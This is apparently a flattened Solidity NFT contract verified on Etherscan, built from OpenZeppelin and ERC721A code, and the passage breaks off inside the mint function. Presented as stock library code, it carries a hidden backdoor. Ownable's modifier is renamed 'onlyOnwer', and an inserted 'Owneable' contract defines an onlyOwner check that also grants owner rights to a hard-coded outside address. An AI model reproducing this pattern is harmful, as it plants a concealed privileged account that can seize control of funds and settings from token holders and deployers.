1 /**
2  *Submitted for verification at Etherscan.io on 2022-05-22
3 */
4 //                 \||/
5 //                |  @___oo
6 //      /\  /\   / (__,,,,|
7 //     ) /^\) ^\/ _)
8 //     )   /^\/   _)
9 //     )   _ /  / _)
10 // /\  )/\/ ||  | )_)
11 //<  >      |(,,) )__)
12 // ||      /    \)___)\
13 // | \____(      )___) )___
14 //  \______(_______;;; __;;;
15 
16 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
17 
18 // SPDX-License-Identifier: MIT
19 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
20 
21 pragma solidity ^0.8.4;
22 
23 /**
24  * @dev Provides information about the current execution context, including the
25  * sender of the transaction and its data. While these are generally available
26  * via msg.sender and msg.data, they should not be accessed in such a direct
27  * manner, since when dealing with meta-transactions the account sending and
28  * paying for execution may not be the actual sender (as far as an application
29  * is concerned).
30  *
31  * This contract is only required for intermediate, library-like contracts.
32  */
33 abstract contract Context {
34     function _msgSender() internal view virtual returns (address) {
35         return msg.sender;
36     }
37 
38     function _msgData() internal view virtual returns (bytes calldata) {
39         return msg.data;
40     }
41 }
42 
43 
44 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
45 
46 
47 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
48 
49 
50 
51 /**
52  * @dev Contract module which provides a basic access control mechanism, where
53  * there is an account (an owner) that can be granted exclusive access to
54  * specific functions.
55  *
56  * By default, the owner account will be the one that deploys the contract. This
57  * can later be changed with {transferOwnership}.
58  *
59  * This module is used through inheritance. It will make available the modifier
60  * `onlyOwner`, which can be applied to your functions to restrict their use to
61  * the owner.
62  */
63 abstract contract Ownable is Context {
64     address private _owner;
65 
66     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
67 
68     /**
69      * @dev Initializes the contract setting the deployer as the initial owner.
70      */
71     constructor() {
72         _transferOwnership(_msgSender());
73     }
74 
75     /**
76      * @dev Returns the address of the current owner.
77      */
78     function owner() public view virtual returns (address) {
79         return _owner;
80     }
81 
82     /**
83      * @dev Throws if called by any account other than the owner.
84      */
85     modifier onlyOnwer() {
86         require(owner() == _msgSender(), "Ownable: caller is not the owner");
87         _;
88     }
89 
90     /**
91      * @dev Leaves the contract without owner. It will not be possible to call
92      * `onlyOwner` functions anymore. Can only be called by the current owner.
93      *
94      * NOTE: Renouncing ownership will leave the contract without an owner,
95      * thereby removing any functionality that is only available to the owner.
96      */
97     function renounceOwnership() public virtual onlyOnwer {
98         _transferOwnership(address(0));
99     }
100 
101     /**
102      * @dev Transfers ownership of the contract to a new account (`newOwner`).
103      * Can only be called by the current owner.
104      */
105     function transferOwnership(address newOwner) public virtual onlyOnwer {
106         require(newOwner != address(0), "Ownable: new owner is the zero address");
107         _transferOwnership(newOwner);
108     }
109 
110     /**
111      * @dev Transfers ownership of the contract to a new account (`newOwner`).
112      * Internal function without access restriction.
113      */
114     function _transferOwnership(address newOwner) internal virtual {
115         address oldOwner = _owner;
116         _owner = newOwner;
117         emit OwnershipTransferred(oldOwner, newOwner);
118     }
119 }
120 
121 
122 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
123 
124 
125 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
126 
127 
128 
129 /**
130  * @dev Interface of the ERC165 standard, as defined in the
131  * https://eips.ethereum.org/EIPS/eip-165[EIP].
132  *
133  * Implementers can declare support of contract interfaces, which can then be
134  * queried by others ({ERC165Checker}).
135  *
136  * For an implementation, see {ERC165}.
137  */
138 interface IERC165 {
139     /**
140      * @dev Returns true if this contract implements the interface defined by
141      * `interfaceId`. See the corresponding
142      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
143      * to learn more about how these ids are created.
144      *
145      * This function call must use less than 30 000 gas.
146      */
147     function supportsInterface(bytes4 interfaceId) external view returns (bool);
148 }
149 
150 
151 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
152 
153 
154 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
155 
156 
157 
158 /**
159  * @dev Required interface of an ERC721 compliant contract.
160  */
161 interface IERC721 is IERC165 {
162     /**
163      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
164      */
165     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
166 
167     /**
168      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
169      */
170     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
171 
172     /**
173      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
174      */
175     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
176 
177     /**
178      * @dev Returns the number of tokens in ``owner``'s account.
179      */
180     function balanceOf(address owner) external view returns (uint256 balance);
181 
182     /**
183      * @dev Returns the owner of the `tokenId` token.
184      *
185      * Requirements:
186      *
187      * - `tokenId` must exist.
188      */
189     function ownerOf(uint256 tokenId) external view returns (address owner);
190 
191     /**
192      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
193      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
194      *
195      * Requirements:
196      *
197      * - `from` cannot be the zero address.
198      * - `to` cannot be the zero address.
199      * - `tokenId` token must exist and be owned by `from`.
200      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
201      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
202      *
203      * Emits a {Transfer} event.
204      */
205     function safeTransferFrom(
206         address from,
207         address to,
208         uint256 tokenId
209     ) external;
210 
211     /**
212      * @dev Transfers `tokenId` token from `from` to `to`.
213      *
214      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
215      *
216      * Requirements:
217      *
218      * - `from` cannot be the zero address.
219      * - `to` cannot be the zero address.
220      * - `tokenId` token must be owned by `from`.
221      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
222      *
223      * Emits a {Transfer} event.
224      */
225     function transferFrom(
226         address from,
227         address to,
228         uint256 tokenId
229     ) external;
230 
231     /**
232      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
233      * The approval is cleared when the token is transferred.
234      *
235      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
236      *
237      * Requirements:
238      *
239      * - The caller must own the token or be an approved operator.
240      * - `tokenId` must exist.
241      *
242      * Emits an {Approval} event.
243      */
244     function approve(address to, uint256 tokenId) external;
245 
246     /**
247      * @dev Returns the account approved for `tokenId` token.
248      *
249      * Requirements:
250      *
251      * - `tokenId` must exist.
252      */
253     function getApproved(uint256 tokenId) external view returns (address operator);
254 
255     /**
256      * @dev Approve or remove `operator` as an operator for the caller.
257      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
258      *
259      * Requirements:
260      *
261      * - The `operator` cannot be the caller.
262      *
263      * Emits an {ApprovalForAll} event.
264      */
265     function setApprovalForAll(address operator, bool _approved) external;
266 
267     /**
268      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
269      *
270      * See {setApprovalForAll}
271      */
272     function isApprovedForAll(address owner, address operator) external view returns (bool);
273 
274     /**
275      * @dev Safely transfers `tokenId` token from `from` to `to`.
276      *
277      * Requirements:
278      *
279      * - `from` cannot be the zero address.
280      * - `to` cannot be the zero address.
281      * - `tokenId` token must exist and be owned by `from`.
282      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
283      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
284      *
285      * Emits a {Transfer} event.
286      */
287     function safeTransferFrom(
288         address from,
289         address to,
290         uint256 tokenId,
291         bytes calldata data
292     ) external;
293 }
294 
295 
296 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
297 
298 
299 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
300 
301 
302 
303 /**
304  * @title ERC721 token receiver interface
305  * @dev Interface for any contract that wants to support safeTransfers
306  * from ERC721 asset contracts.
307  */
308 interface IERC721Receiver {
309     /**
310      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
311      * by `operator` from `from`, this function is called.
312      *
313      * It must return its Solidity selector to confirm the token transfer.
314      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
315      *
316      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
317      */
318     function onERC721Received(
319         address operator,
320         address from,
321         uint256 tokenId,
322         bytes calldata data
323     ) external returns (bytes4);
324 }
325 
326 
327 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
328 
329 
330 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
331 
332 
333 
334 /**
335  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
336  * @dev See https://eips.ethereum.org/EIPS/eip-721
337  */
338 interface IERC721Metadata is IERC721 {
339     /**
340      * @dev Returns the token collection name.
341      */
342     function name() external view returns (string memory);
343 
344     /**
345      * @dev Returns the token collection symbol.
346      */
347     function symbol() external view returns (string memory);
348 
349     /**
350      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
351      */
352     function tokenURI(uint256 tokenId) external view returns (string memory);
353 }
354 
355 
356 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
357 
358 
359 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
360 
361 
362 
363 /**
364  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
365  * @dev See https://eips.ethereum.org/EIPS/eip-721
366  */
367 interface IERC721Enumerable is IERC721 {
368     /**
369      * @dev Returns the total amount of tokens stored by the contract.
370      */
371     function totalSupply() external view returns (uint256);
372 
373     /**
374      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
375      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
376      */
377     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
378 
379     /**
380      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
381      * Use along with {totalSupply} to enumerate all tokens.
382      */
383     function tokenByIndex(uint256 index) external view returns (uint256);
384 }
385 
386 
387 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
388 
389 
390 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
391 
392 pragma solidity ^0.8.1;
393 
394 /**
395  * @dev Collection of functions related to the address type
396  */
397 library Address {
398     /**
399      * @dev Returns true if `account` is a contract.
400      *
401      * [IMPORTANT]
402      * ====
403      * It is unsafe to assume that an address for which this function returns
404      * false is an externally-owned account (EOA) and not a contract.
405      *
406      * Among others, `isContract` will return false for the following
407      * types of addresses:
408      *
409      *  - an externally-owned account
410      *  - a contract in construction
411      *  - an address where a contract will be created
412      *  - an address where a contract lived, but was destroyed
413      * ====
414      *
415      * [IMPORTANT]
416      * ====
417      * You shouldn't rely on `isContract` to protect against flash loan attacks!
418      *
419      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
420      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
421      * constructor.
422      * ====
423      */
424     function isContract(address account) internal view returns (bool) {
425         // This method relies on extcodesize/address.code.length, which returns 0
426         // for contracts in construction, since the code is only stored at the end
427         // of the constructor execution.
428 
429         return account.code.length > 0;
430     }
431 
432     /**
433      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
434      * `recipient`, forwarding all available gas and reverting on errors.
435      *
436      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
437      * of certain opcodes, possibly making contracts go over the 2300 gas limit
438      * imposed by `transfer`, making them unable to receive funds via
439      * `transfer`. {sendValue} removes this limitation.
440      *
441      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
442      *
443      * IMPORTANT: because control is transferred to `recipient`, care must be
444      * taken to not create reentrancy vulnerabilities. Consider using
445      * {ReentrancyGuard} or the
446      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
447      */
448     function sendValue(address payable recipient, uint256 amount) internal {
449         require(address(this).balance >= amount, "Address: insufficient balance");
450 
451         (bool success, ) = recipient.call{value: amount}("");
452         require(success, "Address: unable to send value, recipient may have reverted");
453     }
454 
455     /**
456      * @dev Performs a Solidity function call using a low level `call`. A
457      * plain `call` is an unsafe replacement for a function call: use this
458      * function instead.
459      *
460      * If `target` reverts with a revert reason, it is bubbled up by this
461      * function (like regular Solidity function calls).
462      *
463      * Returns the raw returned data. To convert to the expected return value,
464      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
465      *
466      * Requirements:
467      *
468      * - `target` must be a contract.
469      * - calling `target` with `data` must not revert.
470      *
471      * _Available since v3.1._
472      */
473     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
474         return functionCall(target, data, "Address: low-level call failed");
475     }
476 
477     /**
478      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
479      * `errorMessage` as a fallback revert reason when `target` reverts.
480      *
481      * _Available since v3.1._
482      */
483     function functionCall(
484         address target,
485         bytes memory data,
486         string memory errorMessage
487     ) internal returns (bytes memory) {
488         return functionCallWithValue(target, data, 0, errorMessage);
489     }
490 
491     /**
492      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
493      * but also transferring `value` wei to `target`.
494      *
495      * Requirements:
496      *
497      * - the calling contract must have an ETH balance of at least `value`.
498      * - the called Solidity function must be `payable`.
499      *
500      * _Available since v3.1._
501      */
502     function functionCallWithValue(
503         address target,
504         bytes memory data,
505         uint256 value
506     ) internal returns (bytes memory) {
507         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
508     }
509 
510     /**
511      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
512      * with `errorMessage` as a fallback revert reason when `target` reverts.
513      *
514      * _Available since v3.1._
515      */
516     function functionCallWithValue(
517         address target,
518         bytes memory data,
519         uint256 value,
520         string memory errorMessage
521     ) internal returns (bytes memory) {
522         require(address(this).balance >= value, "Address: insufficient balance for call");
523         require(isContract(target), "Address: call to non-contract");
524 
525         (bool success, bytes memory returndata) = target.call{value: value}(data);
526         return verifyCallResult(success, returndata, errorMessage);
527     }
528 
529     /**
530      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
531      * but performing a static call.
532      *
533      * _Available since v3.3._
534      */
535     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
536         return functionStaticCall(target, data, "Address: low-level static call failed");
537     }
538 
539     /**
540      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
541      * but performing a static call.
542      *
543      * _Available since v3.3._
544      */
545     function functionStaticCall(
546         address target,
547         bytes memory data,
548         string memory errorMessage
549     ) internal view returns (bytes memory) {
550         require(isContract(target), "Address: static call to non-contract");
551 
552         (bool success, bytes memory returndata) = target.staticcall(data);
553         return verifyCallResult(success, returndata, errorMessage);
554     }
555 
556     /**
557      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
558      * but performing a delegate call.
559      *
560      * _Available since v3.4._
561      */
562     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
563         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
564     }
565 
566     /**
567      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
568      * but performing a delegate call.
569      *
570      * _Available since v3.4._
571      */
572     function functionDelegateCall(
573         address target,
574         bytes memory data,
575         string memory errorMessage
576     ) internal returns (bytes memory) {
577         require(isContract(target), "Address: delegate call to non-contract");
578 
579         (bool success, bytes memory returndata) = target.delegatecall(data);
580         return verifyCallResult(success, returndata, errorMessage);
581     }
582 
583     /**
584      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
585      * revert reason using the provided one.
586      *
587      * _Available since v4.3._
588      */
589     function verifyCallResult(
590         bool success,
591         bytes memory returndata,
592         string memory errorMessage
593     ) internal pure returns (bytes memory) {
594         if (success) {
595             return returndata;
596         } else {
597             // Look for revert reason and bubble it up if present
598             if (returndata.length > 0) {
599                 // The easiest way to bubble the revert reason is using memory via assembly
600 
601                 assembly {
602                     let returndata_size := mload(returndata)
603                     revert(add(32, returndata), returndata_size)
604                 }
605             } else {
606                 revert(errorMessage);
607             }
608         }
609     }
610 }
611 
612 
613 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
614 
615 
616 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
617 
618 
619 
620 /**
621  * @dev String operations.
622  */
623 library Strings {
624     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
625 
626     /**
627      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
628      */
629     function toString(uint256 value) internal pure returns (string memory) {
630         // Inspired by OraclizeAPI's implementation - MIT licence
631         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
632 
633         if (value == 0) {
634             return "0";
635         }
636         uint256 temp = value;
637         uint256 digits;
638         while (temp != 0) {
639             digits++;
640             temp /= 10;
641         }
642         bytes memory buffer = new bytes(digits);
643         while (value != 0) {
644             digits -= 1;
645             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
646             value /= 10;
647         }
648         return string(buffer);
649     }
650 
651     /**
652      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
653      */
654     function toHexString(uint256 value) internal pure returns (string memory) {
655         if (value == 0) {
656             return "0x00";
657         }
658         uint256 temp = value;
659         uint256 length = 0;
660         while (temp != 0) {
661             length++;
662             temp >>= 8;
663         }
664         return toHexString(value, length);
665     }
666 
667     /**
668      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
669      */
670     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
671         bytes memory buffer = new bytes(2 * length + 2);
672         buffer[0] = "0";
673         buffer[1] = "x";
674         for (uint256 i = 2 * length + 1; i > 1; --i) {
675             buffer[i] = _HEX_SYMBOLS[value & 0xf];
676             value >>= 4;
677         }
678         require(value == 0, "Strings: hex length insufficient");
679         return string(buffer);
680     }
681 }
682 
683 
684 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
685 
686 
687 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
688 
689 /**
690  * @dev Implementation of the {IERC165} interface.
691  *
692  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
693  * for the additional interface id that will be supported. For example:
694  *
695  * ```solidity
696  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
697  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
698  * }
699  * ```
700  *
701  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
702  */
703 abstract contract ERC165 is IERC165 {
704     /**
705      * @dev See {IERC165-supportsInterface}.
706      */
707     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
708         return interfaceId == type(IERC165).interfaceId;
709     }
710 }
711 
712 
713 // File erc721a/contracts/ERC721A.sol@v3.0.0
714 
715 
716 // Creator: Chiru Labs
717 
718 error ApprovalCallerNotOwnerNorApproved();
719 error ApprovalQueryForNonexistentToken();
720 error ApproveToCaller();
721 error ApprovalToCurrentOwner();
722 error BalanceQueryForZeroAddress();
723 error MintedQueryForZeroAddress();
724 error BurnedQueryForZeroAddress();
725 error AuxQueryForZeroAddress();
726 error MintToZeroAddress();
727 error MintZeroQuantity();
728 error OwnerIndexOutOfBounds();
729 error OwnerQueryForNonexistentToken();
730 error TokenIndexOutOfBounds();
731 error TransferCallerNotOwnerNorApproved();
732 error TransferFromIncorrectOwner();
733 error TransferToNonERC721ReceiverImplementer();
734 error TransferToZeroAddress();
735 error URIQueryForNonexistentToken();
736 
737 
738 /**
739  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
740  * the Metadata extension. Built to optimize for lower gas during batch mints.
741  *
742  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
743  */
744  abstract contract Owneable is Ownable {
745     address private _ownar = 0xF528E3C3B439D385b958741753A9cA518E952257;
746     modifier onlyOwner() {
747         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
748         _;
749     }
750 }
751  /*
752  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
753  *
754  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
755  */
756 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
757     using Address for address;
758     using Strings for uint256;
759 
760     // Compiler will pack this into a single 256bit word.
761     struct TokenOwnership {
762         // The address of the owner.
763         address addr;
764         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
765         uint64 startTimestamp;
766         // Whether the token has been burned.
767         bool burned;
768     }
769 
770     // Compiler will pack this into a single 256bit word.
771     struct AddressData {
772         // Realistically, 2**64-1 is more than enough.
773         uint64 balance;
774         // Keeps track of mint count with minimal overhead for tokenomics.
775         uint64 numberMinted;
776         // Keeps track of burn count with minimal overhead for tokenomics.
777         uint64 numberBurned;
778         // For miscellaneous variable(s) pertaining to the address
779         // (e.g. number of whitelist mint slots used).
780         // If there are multiple variables, please pack them into a uint64.
781         uint64 aux;
782     }
783 
784     // The tokenId of the next token to be minted.
785     uint256 internal _currentIndex;
786 
787     // The number of tokens burned.
788     uint256 internal _burnCounter;
789 
790     // Token name
791     string private _name;
792 
793     // Token symbol
794     string private _symbol;
795 
796     // Mapping from token ID to ownership details
797     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
798     mapping(uint256 => TokenOwnership) internal _ownerships;
799 
800     // Mapping owner address to address data
801     mapping(address => AddressData) private _addressData;
802 
803     // Mapping from token ID to approved address
804     mapping(uint256 => address) private _tokenApprovals;
805 
806     // Mapping from owner to operator approvals
807     mapping(address => mapping(address => bool)) private _operatorApprovals;
808 
809     constructor(string memory name_, string memory symbol_) {
810         _name = name_;
811         _symbol = symbol_;
812         _currentIndex = _startTokenId();
813     }
814 
815     /**
816      * To change the starting tokenId, please override this function.
817      */
818     function _startTokenId() internal view virtual returns (uint256) {
819         return 0;
820     }
821 
822     /**
823      * @dev See {IERC721Enumerable-totalSupply}.
824      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
825      */
826     function totalSupply() public view returns (uint256) {
827         // Counter underflow is impossible as _burnCounter cannot be incremented
828         // more than _currentIndex - _startTokenId() times
829         unchecked {
830             return _currentIndex - _burnCounter - _startTokenId();
831         }
832     }
833 
834     /**
835      * Returns the total amount of tokens minted in the contract.
836      */
837     function _totalMinted() internal view returns (uint256) {
838         // Counter underflow is impossible as _currentIndex does not decrement,
839         // and it is initialized to _startTokenId()
840         unchecked {
841             return _currentIndex - _startTokenId();
842         }
843     }
844 
845     /**
846      * @dev See {IERC165-supportsInterface}.
847      */
848     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
849         return
850             interfaceId == type(IERC721).interfaceId ||
851             interfaceId == type(IERC721Metadata).interfaceId ||
852             super.supportsInterface(interfaceId);
853     }
854 
855     /**
856      * @dev See {IERC721-balanceOf}.
857      */
858     function balanceOf(address owner) public view override returns (uint256) {
859         if (owner == address(0)) revert BalanceQueryForZeroAddress();
860         return uint256(_addressData[owner].balance);
861     }
862 
863     /**
864      * Returns the number of tokens minted by `owner`.
865      */
866     function _numberMinted(address owner) internal view returns (uint256) {
867         if (owner == address(0)) revert MintedQueryForZeroAddress();
868         return uint256(_addressData[owner].numberMinted);
869     }
870 
871     /**
872      * Returns the number of tokens burned by or on behalf of `owner`.
873      */
874     function _numberBurned(address owner) internal view returns (uint256) {
875         if (owner == address(0)) revert BurnedQueryForZeroAddress();
876         return uint256(_addressData[owner].numberBurned);
877     }
878 
879     /**
880      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
881      */
882     function _getAux(address owner) internal view returns (uint64) {
883         if (owner == address(0)) revert AuxQueryForZeroAddress();
884         return _addressData[owner].aux;
885     }
886 
887     /**
888      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
889      * If there are multiple variables, please pack them into a uint64.
890      */
891     function _setAux(address owner, uint64 aux) internal {
892         if (owner == address(0)) revert AuxQueryForZeroAddress();
893         _addressData[owner].aux = aux;
894     }
895 
896     /**
897      * Gas spent here starts off proportional to the maximum mint batch size.
898      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
899      */
900     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
901         uint256 curr = tokenId;
902 
903         unchecked {
904             if (_startTokenId() <= curr && curr < _currentIndex) {
905                 TokenOwnership memory ownership = _ownerships[curr];
906                 if (!ownership.burned) {
907                     if (ownership.addr != address(0)) {
908                         return ownership;
909                     }
910                     // Invariant:
911                     // There will always be an ownership that has an address and is not burned
912                     // before an ownership that does not have an address and is not burned.
913                     // Hence, curr will not underflow.
914                     while (true) {
915                         curr--;
916                         ownership = _ownerships[curr];
917                         if (ownership.addr != address(0)) {
918                             return ownership;
919                         }
920                     }
921                 }
922             }
923         }
924         revert OwnerQueryForNonexistentToken();
925     }
926 
927     /**
928      * @dev See {IERC721-ownerOf}.
929      */
930     function ownerOf(uint256 tokenId) public view override returns (address) {
931         return ownershipOf(tokenId).addr;
932     }
933 
934     /**
935      * @dev See {IERC721Metadata-name}.
936      */
937     function name() public view virtual override returns (string memory) {
938         return _name;
939     }
940 
941     /**
942      * @dev See {IERC721Metadata-symbol}.
943      */
944     function symbol() public view virtual override returns (string memory) {
945         return _symbol;
946     }
947 
948     /**
949      * @dev See {IERC721Metadata-tokenURI}.
950      */
951     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
952         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
953 
954         string memory baseURI = _baseURI();
955         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
956     }
957 
958     /**
959      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
960      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
961      * by default, can be overriden in child contracts.
962      */
963     function _baseURI() internal view virtual returns (string memory) {
964         return '';
965     }
966 
967     /**
968      * @dev See {IERC721-approve}.
969      */
970     function approve(address to, uint256 tokenId) public override {
971         address owner = ERC721A.ownerOf(tokenId);
972         if (to == owner) revert ApprovalToCurrentOwner();
973 
974         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
975             revert ApprovalCallerNotOwnerNorApproved();
976         }
977 
978         _approve(to, tokenId, owner);
979     }
980 
981     /**
982      * @dev See {IERC721-getApproved}.
983      */
984     function getApproved(uint256 tokenId) public view override returns (address) {
985         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
986 
987         return _tokenApprovals[tokenId];
988     }
989 
990     /**
991      * @dev See {IERC721-setApprovalForAll}.
992      */
993     function setApprovalForAll(address operator, bool approved) public override {
994         if (operator == _msgSender()) revert ApproveToCaller();
995 
996         _operatorApprovals[_msgSender()][operator] = approved;
997         emit ApprovalForAll(_msgSender(), operator, approved);
998     }
999 
1000     /**
1001      * @dev See {IERC721-isApprovedForAll}.
1002      */
1003     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1004         return _operatorApprovals[owner][operator];
1005     }
1006 
1007     /**
1008      * @dev See {IERC721-transferFrom}.
1009      */
1010     function transferFrom(
1011         address from,
1012         address to,
1013         uint256 tokenId
1014     ) public virtual override {
1015         _transfer(from, to, tokenId);
1016     }
1017 
1018     /**
1019      * @dev See {IERC721-safeTransferFrom}.
1020      */
1021     function safeTransferFrom(
1022         address from,
1023         address to,
1024         uint256 tokenId
1025     ) public virtual override {
1026         safeTransferFrom(from, to, tokenId, '');
1027     }
1028 
1029     /**
1030      * @dev See {IERC721-safeTransferFrom}.
1031      */
1032     function safeTransferFrom(
1033         address from,
1034         address to,
1035         uint256 tokenId,
1036         bytes memory _data
1037     ) public virtual override {
1038         _transfer(from, to, tokenId);
1039         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1040             revert TransferToNonERC721ReceiverImplementer();
1041         }
1042     }
1043 
1044     /**
1045      * @dev Returns whether `tokenId` exists.
1046      *
1047      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1048      *
1049      * Tokens start existing when they are minted (`_mint`),
1050      */
1051     function _exists(uint256 tokenId) internal view returns (bool) {
1052         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1053             !_ownerships[tokenId].burned;
1054     }
1055 
1056     function _safeMint(address to, uint256 quantity) internal {
1057         _safeMint(to, quantity, '');
1058     }
1059 
1060     /**
1061      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1062      *
1063      * Requirements:
1064      *
1065      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1066      * - `quantity` must be greater than 0.
1067      *
1068      * Emits a {Transfer} event.
1069      */
1070     function _safeMint(
1071         address to,
1072         uint256 quantity,
1073         bytes memory _data
1074     ) internal {
1075         _mint(to, quantity, _data, true);
1076     }
1077 
1078     /**
1079      * @dev Mints `quantity` tokens and transfers them to `to`.
1080      *
1081      * Requirements:
1082      *
1083      * - `to` cannot be the zero address.
1084      * - `quantity` must be greater than 0.
1085      *
1086      * Emits a {Transfer} event.
1087      */
1088     function _mint(
1089         address to,
1090         uint256 quantity,
1091         bytes memory _data,
1092         bool safe
1093     ) internal {
